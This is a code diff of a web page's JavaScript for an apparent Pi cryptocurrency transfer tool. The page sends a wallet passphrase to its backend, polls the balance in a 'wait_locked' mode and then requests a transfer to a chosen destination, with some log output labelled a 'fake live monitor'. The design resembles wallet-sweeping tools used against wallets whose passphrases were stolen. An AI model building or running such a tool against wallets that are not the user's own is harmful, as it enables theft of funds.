@@ -237,7 +237,7 @@
     <div id="response"> Awaiting command...</div>
   </div>
 
-<script>
+  <script>
   const form = document.getElementById("transferForm");
   const responseBox = document.getElementById("response");
 
@@ -256,16 +256,14 @@
 
     let monitoring = false;
     let logs = [];
-
     responseBox.innerText = "booting wallet in progress...\n";
 
-    // Start live logs (simulated unless backend supports full push updates)
+    // Start fake live monitor
     if (mode === "wait_locked") {
       monitoring = true;
       logs.push("Monitoring wallet...");
       logs.push("Target: " + amount + " Pi");
 
-      // Fake polling logs every 2 seconds
       const pollInterval = setInterval(async () => {
         if (!monitoring) return clearInterval(pollInterval);
 
@@ -277,20 +275,25 @@
             },
             body: JSON.stringify({ passphrase })
           });
+
           const data = await res.json();
           if (data.status === "success") {
-          logs.push(`Available Balance: ${data.balance}`);
-            logs.push("Waiting for more Pi...");
-            responseBox.innerText = logs.slice(-8).join("\n");
+            logs.push(`Available Balance: ${data.balance}`);
+          } else {
+            logs.push(`Error: ${data.message}`);
           }
+
+          responseBox.innerText = logs.slice(-10).join("\n");
+
         } catch (err) {
-          logs.push("Error checking balance...");
-          responseBox.innerText = logs.slice(-8).join("\n");
+          logs.push("Error polling wallet...");
+          responseBox.innerText = logs.slice(-10).join("\n");
         }
-      }, 2000);
+
+      }, 3000); // every 3 seconds
     }
 
-    // Begin transfer process
+    // Begin transfer request
     try {
       const res = await fetch("/transfer", {
         method: "POST",
@@ -300,8 +303,14 @@
         body: JSON.stringify({ passphrase, destination, amount, mode })
       });
 
-      const result = await res.json();
-      monitoring = false;
+      let result;
+      try {
+        result = await res.json();
+      } catch (err) {
+        responseBox.innerText = "system crashed please restart\n(Server returned invalid response)";
+        monitoring = false;
+        return;
+      }
 
       if (res.ok) {
         responseBox.innerText = result.message || "transaction successful";
@@ -310,11 +319,12 @@
       }
 
     } catch (err) {
-      monitoring = false;
       responseBox.innerText = "system crashed please restart\n" + err.message;
     }
+
+    monitoring = false;
   });
-</script>
+    </script>
 
   
    <script>
